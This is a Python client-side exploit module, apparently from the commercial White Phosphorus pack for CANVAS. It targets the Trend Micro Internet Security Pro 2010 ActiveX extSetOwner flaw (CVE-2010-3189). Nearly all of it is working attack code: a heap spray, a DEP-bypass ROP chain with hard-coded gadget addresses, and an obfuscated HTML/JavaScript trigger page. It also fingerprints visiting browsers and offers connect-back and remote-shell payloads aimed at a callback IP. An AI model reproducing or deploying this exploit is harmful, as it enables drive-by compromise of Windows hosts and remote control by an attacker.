
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import sys
import time
from struct import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *

from exploitutils import *
from tcpexploit import *

from httpclientside import httpclientside
from libs.jsobfuscate.jsobfuscate import JSObfuscator


######################################################################################
NAME = "Trend Micro Internet Security Pro 2010 ActiveX extSetOwner Exploit"
DESCRIPTION = "Exploits an invalid memory use vulnerability in the UfProxyBrowserCtrl ActiveX control (UfPBCtrl.dll)"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='Trend Micro'
DOCUMENTATION["Date public"] = "2010-08-25"
DOCUMENTATION['CVE Name']="CVE-2010-3189"
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=2010-3189'
DOCUMENTATION['CVSS'] = '9.3'
DOCUMENTATION["References"] ="""http://www.zerodayinitiative.com/advisories/ZDI-10-165/
http://esupport.trendmicro.com/pages/Hot-Fix-UfPBCtrldll-is-vulnerable-to-remote-attackers.aspx"""
DOCUMENTATION["Repeatability"] = "Unlimited"   
DOCUMENTATION["Notes"] = """
This is a client-side exploit - so use it via clientd or httpserver, or host the exploit file on an independandant webserver.
"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "XP", "Vista", "7"]
PROPERTY['DELIVERY'] = 'HTTP'

NOTES="""
This is a client-side exploit - so use it via clientd or httpserver, or host the exploit file on an independandant webserver.

---------------------------------------------------------------------
WP> White Phosphorus Exploit Pack
WP> Trend Micro Internet Security Pro 2010 ActiveX extSetOwner Exploit
---------------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>
-F <filename>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: Windows Universal DEP Bypass

Payloads:
0: IE Inject Connect Back
1: HTTPMOSDEF SSL
2: HTTPMOSDEF PLAIN
3: Execute Command

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_trendmicro_securitypro_2010/wp_trendmicro_securitypro_2010.py  -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

PORT = 0
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Windows Universal DEP Bypass", (0x00000000), [WINALL]]
  }


class theexploit(wp_exploit, httpclientside):
    ######################################################################################
    ## WP> Dialog Information
    ##########################s############################################################
    PAYLOADS=["IE Inject Connect Back",
              "HTTPMOSDEF SSL",
              "HTTPMOSDEF PLAIN",
              "Execute Command"]
    
    # Clienside exploits default to HTTPMosdef PLAIN for clientD
    DEFAULT_PAYLOAD = 2

    def __init__(self):
        wp_exploit.__init__(self)
        httpclientside.__init__(self)
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.targets = targets
        self.version = 0
        self.use_universal = True
        # We default these to false        
        self.HTTPMOSDEF   = False
        self.useSSLMOSDEF = False
        self.isClientD    = False
                        
        self.badstring    = '\0'
        
        #Ranomisze name for clientd
        self.filename="".join( [ random.choice(string.uppercase) for x in range(8) ] ) + ".html"          
                
        # HTTP Custom Stuff
        self.jsObfuscator = JSObfuscator()
        self.jsObfuscator.xorKeyFromCookie("SessionID")
       
        return

    def is_vulnerable(self, info_dict):
        # Called from ClientD, if recon modules are enabled
        # returns a value used to rank the exploit within attacking modules
        """
        Check for IE
        """
        self.isClientD = True
        if "MSIE" in info_dict['user_agent']:
            self.log("WP> Target has MSIE")
            language = info_dict['plugins'].get("language", "")
            if type(language)==type([]):
                language=language[0] # it's a list in actuality
            self.log("WP> language found: %s"%language)
            if "en-us" in language:
                return 95
            else:
                return 20
        return 0

    def usage(self):
        self.wp_usage(targets,"-F <filename>")
        return  

    def neededListenerTypes(self):
        self.getArgs()
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        #self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    

    def getArgs(self):
        # If Called from clientD, update shellcode accordingly
        if getattr(self,'useSSLMOSDEF', False):
            self.isClientD = True
            self.DEFAULT_PAYLOAD = 1

        else:
            # Potentially called from httpserver update shellcode accordingly        
            if self.HTTPMOSDEF:
                if self.useSSLMOSDEF:
                    self.DEFAULT_PAYLOAD = 1
                else:
                    self.DEFAULT_PAYLOAD = 2
            
        # Selected shell options
        self.wp_getShellcodeType()
        
        # If called from clientD there will be no target here
        if self.target:    
            self.host=self.target.interface
            
        self.filename=self.argsDict.get('filename',self.filename)
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return
        
    def makefile(self):
        # Exploit file
        landingAddress=pack('<L', 0x126A10C0)
                             
        # Build our heapspray repeated block
        heapspraycode = pack('<L', 0x516116E3)  # pop,retn 0c (For sliding)
        heapspraycode += pack('<L', 0x5161385C)  # Stack Pivot (EAX->ESP)
        heapspraycode += pack('<L', 0x516116E3)  # retn 0c (For sliding)
        heapspraycode += pack('<L', 0x5161385C)  # Stack Pivot (EAX->ESP)
        
        depbypass = pack('<L', 0x516110F2)  # RET
        depbypass += pack('<L', 0x516110F2)  # RET
        depbypass += pack('<L', 0x516110F2)  # RET
        depbypass += pack('<L', 0x516110F2)  # RET        
        depbypass += pack('<L', 0x516110F2)  # RET
        depbypass += pack('<L', 0x516110F2)  # RET
        depbypass += pack('<L', 0x516110F2)  # RET 
        depbypass += pack('<L', 0x516110F2)  # RET
        depbypass += pack('<L', 0x516110F2)  # RET
        depbypass += pack('<L', 0x516110F2)  # RET 
                
        depbypass += pack('<L', 0x5161B30C)  # PUSH ESP, POP EDI
        depbypass += pack('<L', 0x5161B30C)  # slackspace
        depbypass += pack('<L', 0x5162189F)  # MOV EAX,EDI
        depbypass += pack('<L', 0x5162189F)  # slackspace
        depbypass += pack('<L', 0x5162189F)  # slackspace
        depbypass += pack('<L', 0x5162189F)  # slackspace
        depbypass += pack('<L', 0x516250A4)  # VA IAT
        depbypass += pack('<L', 0x5161188B)  # POP EBX
        depbypass += pack('<L', 0x516218A1)  # EBX (POP,POP,RET)
        depbypass += pack('<L', 0x51612460)  # MOV EDX,DWORD PTR DS:[ESI], Call EBX
        depbypass += pack('<L', 0x51614CC1)  # PUSH EAX,CALL EDX
        depbypass += pack('<L', 0x000007d0)  # Size
        depbypass += pack('<L', 0x00001000)  # Type
        depbypass += pack('<L', 0x00000040)  # Protect
        depbypass += pack('<L', 0x5161B30C)  # push esp, pop edi
        depbypass += pack('<L', 0x516106eb)  # short jmp
        depbypass += pack('<L', 0x5161198C)  # call edi
        depbypass += pack('<L', 0x51610aeb)  # short jmp
        depbypass += wp_randomnops(12)
              
        filedata = """
        
<html>
<body>
<object ID='target' classid='clsid:15DBC3F9-9F0A-472E-8061-043D9CEC52F0'>
</object>
<script language="JavaScript">
"""
        #script code

        script = """

   
memory = new Array();
shellcode =  unescape("SHELLCODE");
//var len= shellcode.length + 0x21; //0x21 is heap header
var len=0

var heapspray = unescape("HEAPSPRAYCODE");         

while(heapspray.length < 0x120000) heapspray += heapspray; 
heapspray = heapspray.substring(0, 0x120000- len); 

depbypass = unescape("DEPBYPASSCODE");  

heapspray = unescape("%u1111%u1111%u1111%u1111%u1111%u1111") + heapspray; 
heapspray += depbypass + shellcode;

try{ 
for(var i = 0; i < 400; i++) { 
  memory[i]= heapspray.substring(0,heapspray.length); 
}   
}
catch(err)
{}

target.extSetOwner(unescape('ADDRESS'));
"""

        script = script.replace('SHELLCODE',wp_urluencode(wp_randomnops(4) + self.shellcode + ("\x00" * 100)))
        script = script.replace('HEAPSPRAYCODE',wp_urluencode(heapspraycode))
        script = script.replace('DEPBYPASSCODE',wp_urluencode(depbypass))
        script = script.replace('ADDRESS',wp_urluencode(landingAddress))
        
        #Obfuscate the script code
        if self.isClientD:
            self.log("WP> Running jsObfuscator")
            filedata += self.jsObfuscator.obfuscate(script)
        else:
            filedata += script
        
        # Add the reset of the filedata
        filedata+=""" 
</SCRIPT>
</body>
</html>
"""

        return filedata        
  
    def makesploit(self,clientheader,clientbody):
        self.createShellcode()
        
        # The main call from ClientD
        from libs.spkproxy import header,body
        
        h=header('SERVER')
        b=body()
        
        self.log('WP> ****************************************')
        self.log("WP> URL Received: %s"%clientheader.URL)
        user_agent  = clientheader.getStrValue(['User-Agent'])
        
        # Get details
        browser,osversion = wp_browserinfo(user_agent)
        self.log('WP> OSVersion: %s' % osversion)
        self.log('WP> Browser: %s' % browser)
        self.log('WP> ')        
        
        #self.log('WP> User agent of connecting host: %s' % user_agent)        
        
        if clientheader.URL.count(self.filename):
            self.log('WP> Serving exploit html file')

            data=self.makefile()
            if not data:
                return None,None
            b.setBody(data)
            h.addHeader('Content-Type','text/html')
            h.addHeader('Set-Cookie','SessionID=%d' % self.jsObfuscator.getXORKey())
        else:
            self.log('WP> Redirecting to self')
            h.status='302'
            h.addHeader('Location',self.filename)
            h.addHeader('Content-Type','text/html')

        self.log('WP> ****************************************')
        return h,b

    def run(self):

        filedata=self.makefile()
        
        self.log("WP> Opening %s"%(self.filename))
        
        fd=file(self.filename,'wb+')
        fd.write(filedata)
        fd.close()
        
        self.log('WP> Wrote to %s'%(self.filename))
        
        return 1

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
